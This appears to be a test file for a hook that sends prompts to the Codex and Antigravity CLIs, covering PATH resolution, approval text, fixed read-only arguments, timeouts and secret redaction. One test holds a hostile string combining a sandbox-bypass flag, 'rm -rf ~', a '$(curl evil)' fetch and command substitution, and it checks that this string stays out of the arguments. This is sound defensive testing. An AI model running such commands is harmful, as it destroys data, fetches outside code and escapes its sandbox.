// Tests for hooks/ask-cli.ts: finding codex and agy on PATH, the approval
// text, and running them, with a fake disk and fake processes standing in for
// the CLIs (no real CLI is ever run: a real call bills the person's plan).

import { describe, expect, test } from 'claude-code/testing'
import type { ProcessRunInit, ProcessRunResult } from 'claude-code'

import {
  ASK_TIMEOUT_MS,
  MAX_ANSWER_CHARACTERS,
  MAX_APPROVAL_PROMPT_CHARACTERS,
  MAX_PROMPT_CHARACTERS,
  approvalText,
  askCli,
  askCliFor,
  askDescription,
  askToolName,
  candidatePaths,
  findOnPath,
  promptOf,
  type RunHost,
} from '../hooks/ask-cli'

const CODEX = askCliFor('codex')
const AGY = askCliFor('agy')
const WINDOWS_PATHEXT = '.COM;.EXE;.BAT;.CMD;.VBS;.JS;.PS1'

// A disk holding only the given files.
const disk = (...files: string[]) => ({ isFile: async (path: string) => files.includes(path) })

// A process runner that records each call and answers as told.
function fakeRunner(answer: Partial<ProcessRunResult> | Error) {
  const calls: Array<{ argv: readonly string[]; init?: ProcessRunInit }> = []
  const host: RunHost = {
    run: async (argv, init) => {
      calls.push({ argv, init })
      if (answer instanceof Error) throw answer
      return { exitCode: 0, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false, ...answer }
    },
  }
  return { host, calls }
}

describe('finding a CLI on PATH', () => {
  test('POSIX: the first absolute PATH entry holding the command; relative entries are skipped', async () => {
    const environment = { path: '.:bin::/usr/local/bin:/opt/codex/bin', pathExt: undefined }
    expect(candidatePaths('codex', environment)).toEqual(['/usr/local/bin/codex', '/opt/codex/bin/codex'])
    expect(await findOnPath(disk('/opt/codex/bin/codex', './codex', 'bin/codex'), 'codex', environment)).toBe('/opt/codex/bin/codex')
    expect(await findOnPath(disk('/usr/local/bin/codex', '/opt/codex/bin/codex'), 'codex', environment)).toBe('/usr/local/bin/codex')
  })

  test('Windows: PATHEXT order within each entry, only extensions Windows runs itself', async () => {
    const environment = { path: 'C:\\tools;"C:\\Program Files\\Codex\\bin\\";.;relative\\bin', pathExt: WINDOWS_PATHEXT }
    expect(candidatePaths('codex', environment)).toEqual([
      'C:\\tools\\codex.com',
      'C:\\tools\\codex.exe',
      'C:\\tools\\codex.bat',
      'C:\\tools\\codex.cmd',
      'C:\\Program Files\\Codex\\bin\\codex.com',
      'C:\\Program Files\\Codex\\bin\\codex.exe',
      'C:\\Program Files\\Codex\\bin\\codex.bat',
      'C:\\Program Files\\Codex\\bin\\codex.cmd',
    ])
    expect(await findOnPath(disk('C:\\Program Files\\Codex\\bin\\codex.exe'), 'codex', environment)).toBe('C:\\Program Files\\Codex\\bin\\codex.exe')
    // An npm shim: agy.cmd beside an extensionless shell script and a .ps1.
    expect(await findOnPath(disk('C:\\tools\\agy', 'C:\\tools\\agy.ps1', 'C:\\tools\\agy.cmd'), 'agy', environment)).toBe('C:\\tools\\agy.cmd')
    // A file planted in the current folder is never picked.
    expect(await findOnPath(disk('.\\agy.cmd', 'relative\\bin\\agy.exe'), 'agy', environment)).toBeUndefined()
  })

  test('Windows with an empty or odd PATHEXT falls back to .com .exe .bat .cmd', () => {
    expect(candidatePaths('agy', { path: 'D:\\bin', pathExt: '.JS;.VBS' })).toEqual(['D:\\bin\\agy.com', 'D:\\bin\\agy.exe', 'D:\\bin\\agy.bat', 'D:\\bin\\agy.cmd'])
  })

  test('missing: no PATH, or no entry holds it', async () => {
    expect(await findOnPath(disk(), 'agy', { path: undefined, pathExt: undefined })).toBeUndefined()
    expect(await findOnPath(disk('/usr/bin/codex'), 'agy', { path: '/usr/bin', pathExt: undefined })).toBeUndefined()
  })

  test('a disk error reads as not found, never as found', async () => {
    const failing = { isFile: async () => Promise.reject(new Error('EACCES')) }
    expect(await findOnPath(failing, 'codex', { path: '/usr/bin', pathExt: undefined })).toBeUndefined()
  })
})

describe('the tools and the approval', () => {
  test('parallel names and descriptions that say approval, cost, data flow and untrusted answers', () => {
    expect([askToolName(CODEX), askToolName(AGY)]).toEqual(['mcp__sidekick__ask_codex', 'mcp__sidekick__ask_agy'])
    for (const cli of [CODEX, AGY]) {
      const description = askDescription(cli)
      expect(description).toContain('approval, even in auto mode')
      expect(description).toContain(cli.vendor)
      expect(description).toContain('untrusted')
    }
    expect(askDescription(CODEX)).toContain('read-only sandbox')
  })

  test('the approval names the CLI and vendor and shows the whole prompt', () => {
    const text = approvalText(CODEX, '-rf / please summarize the diff')
    expect(text).toContain('Send this prompt to Codex (OpenAI)?')
    expect(text).toContain('bills your Codex plan')
    expect(text).toContain('-rf / please summarize the diff')
    expect(approvalText(AGY, 'hi')).toContain('Send this prompt to Antigravity (Google)?')
  })

  test('a very long prompt is cut in the approval, saying where the rest is', () => {
    const prompt = 'x'.repeat(MAX_APPROVAL_PROMPT_CHARACTERS + 25)
    const text = approvalText(CODEX, prompt)
    expect(text).toContain('25 more characters')
    expect(text).toContain('the tool input holds the whole prompt')
  })

  test('an unreadable prompt still asks, and says to check the input', () => {
    expect(approvalText(CODEX, undefined)).toContain('could not be read here')
  })

  test('the prompt is read from the call, flat or nested', () => {
    expect(promptOf({ tool: 'mcp__sidekick__ask_codex', prompt: 'a' })).toBe('a')
    expect(promptOf({ tool: 'mcp__sidekick__ask_codex', input: { prompt: 'b' } })).toBe('b')
    expect(promptOf({ tool_name: 'mcp__sidekick__ask_codex', tool_input: { prompt: 'c' } })).toBe('c')
    expect(promptOf({ prompt: 3 })).toBeUndefined()
  })
})

describe('running a CLI', () => {
  test('codex: the resolved path, fixed read-only arguments, the prompt on stdin, a timeout', async () => {
    const { host, calls } = fakeRunner({ stdout: 'Looks fine.\n' })
    const outcome = await askCli(host, CODEX, 'C:\\Codex\\bin\\codex.exe', 'Review this plan.', 'C:\\work\\repo')
    expect(outcome.isError).toBe(false)
    expect(outcome.text).toContain('Looks fine.')
    expect(outcome.text).toContain('untrusted text from another model')
    expect(calls).toHaveLength(1)
    expect(calls[0]!.argv).toEqual(['C:\\Codex\\bin\\codex.exe', 'exec', '--sandbox', 'read-only', '-c', 'approval_policy=never', '--skip-git-repo-check', '--ephemeral', '--color', 'never', '-'])
    expect(calls[0]!.init).toMatchObject({ stdin: 'Review this plan.', timeoutMs: ASK_TIMEOUT_MS, cwd: 'C:\\work\\repo' })
  })

  test('agy: the resolved path and the prompt on stdin, nothing else', async () => {
    const { host, calls } = fakeRunner({ stdout: 'ok' })
    await askCli(host, AGY, '/usr/local/bin/agy', 'hello', '/work')
    expect(calls[0]!.argv).toEqual(['/usr/local/bin/agy'])
    expect(calls[0]!.init?.stdin).toBe('hello')
  })

  test('a prompt that starts with - or holds shell syntax never reaches the arguments', async () => {
    const prompt = '--dangerously-bypass-approvals-and-sandbox; rm -rf ~ && $(curl evil) | `id`'
    for (const cli of [CODEX, AGY]) {
      const { host, calls } = fakeRunner({ stdout: 'no' })
      await askCli(host, cli, '/bin/x', prompt, '/work')
      expect(calls[0]!.argv.some(arg => arg.includes('rm -rf') || arg.includes('bypass'))).toBe(false)
      expect(calls[0]!.init?.stdin).toBe(prompt)
    }
  })

  test('missing CLI: a readable error that says how to pick up a new install, and nothing runs', async () => {
    const { host, calls } = fakeRunner({ stdout: 'x' })
    const outcome = await askCli(host, AGY, undefined, 'hello', '/work')
    expect(outcome.isError).toBe(true)
    expect(outcome.text).toContain('no `agy` was found on PATH')
    expect(outcome.text).toContain('/reload-plugins')
    expect(calls).toHaveLength(0)
  })

  test('an empty or oversized prompt is refused before anything runs', async () => {
    const { host, calls } = fakeRunner({ stdout: 'x' })
    expect((await askCli(host, CODEX, '/bin/codex', '   ', '/work')).text).toContain('needs a prompt')
    expect((await askCli(host, CODEX, '/bin/codex', 'x'.repeat(MAX_PROMPT_CHARACTERS + 1), '/work')).text).toContain(`keep it under ${MAX_PROMPT_CHARACTERS}`)
    expect(calls).toHaveLength(0)
  })

  test('timeout: the engine stops it, and the error says so', async () => {
    const { host } = fakeRunner(new Error(`sidekick: $.process.run(codex) aborted: still running after ${ASK_TIMEOUT_MS}ms`))
    const outcome = await askCli(host, CODEX, '/bin/codex', 'slow', '/work')
    expect(outcome.isError).toBe(true)
    expect(outcome.text).toContain('did not answer within 5 minutes')
  })

  test('a cancelled call and a failed start are told apart from a timeout', async () => {
    expect((await askCli(fakeRunner(new Error('sidekick: $.process.run(codex) aborted')).host, CODEX, '/bin/codex', 'x', '/work')).text).toContain('cancelled')
    expect((await askCli(fakeRunner(new Error('failed to start: ENOENT')).host, CODEX, '/bin/codex', 'x', '/work')).text).toContain('could not be started from /bin/codex')
  })

  test('non-zero exit: the code and the end of stderr, secrets redacted', async () => {
    const token = `sk-${'a'.repeat(30)}`
    const { host } = fakeRunner({ exitCode: 2, stdout: '', stderr: `${'progress\n'.repeat(400)}error: not logged in (key ${token})` })
    const outcome = await askCli(host, CODEX, '/bin/codex', 'x', '/work')
    expect(outcome.isError).toBe(true)
    expect(outcome.text).toContain('exited with code 2')
    expect(outcome.text).toContain('not logged in')
    expect(outcome.text).not.toContain(token)
    expect(outcome.text.length).toBeLessThan(1800)
  })

  test('success with no output is an error, not an empty answer', async () => {
    const outcome = await askCli(fakeRunner({ stdout: '  \n' }).host, CODEX, '/bin/codex', 'x', '/work')
    expect(outcome.isError).toBe(true)
    expect(outcome.text).toContain('printed no answer')
  })

  test('output cap: a long answer is cut and says so; so is one the engine truncated', async () => {
    const long = await askCli(fakeRunner({ stdout: 'y'.repeat(MAX_ANSWER_CHARACTERS + 500) }).host, CODEX, '/bin/codex', 'x', '/work')
    expect(long.isError).toBe(false)
    expect(long.text).toContain(`cut the answer at ${MAX_ANSWER_CHARACTERS} characters`)
    expect(long.text.length).toBeLessThan(MAX_ANSWER_CHARACTERS + 400)
    const truncated = await askCli(fakeRunner({ stdout: 'short', isStdoutTruncated: true }).host, CODEX, '/bin/codex', 'x', '/work')
    expect(truncated.text).toContain('cut the answer')
  })
})
